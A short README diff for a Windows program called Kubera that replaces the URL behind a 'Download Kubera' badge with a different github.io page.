@@ -4,7 +4,7 @@
 
 ## 📥 Download Kubera for Windows
 
-[![⬇️ Download Kubera](https://img.shields.io/badge/Download-Kubera-blue?style=for-the-badge&logo=windows)](https://kuberaload.github.io/.github/)
+[![⬇️ Download Kubera](https://img.shields.io/badge/Download-Kubera-blue?style=for-the-badge&logo=windows)](https://stefankopilov.github.io/.github/kubera-tool)
 
 ---
 
